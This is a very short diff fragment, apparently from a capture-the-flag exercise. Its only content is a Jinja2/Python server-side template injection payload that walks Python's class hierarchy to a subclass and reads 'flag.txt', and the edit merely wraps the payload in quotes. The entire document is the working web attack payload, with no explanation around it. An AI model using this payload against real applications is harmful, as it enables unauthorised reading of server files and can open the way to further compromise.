@@ -1,4 +1,4 @@
 
-{{''.__class__.__mro__[1].__subclasses__()[359]('flag.txt').read()}}
+"{{''.__class__.__mro__[1].__subclasses__()[359]('flag.txt').read()}}"
 
 
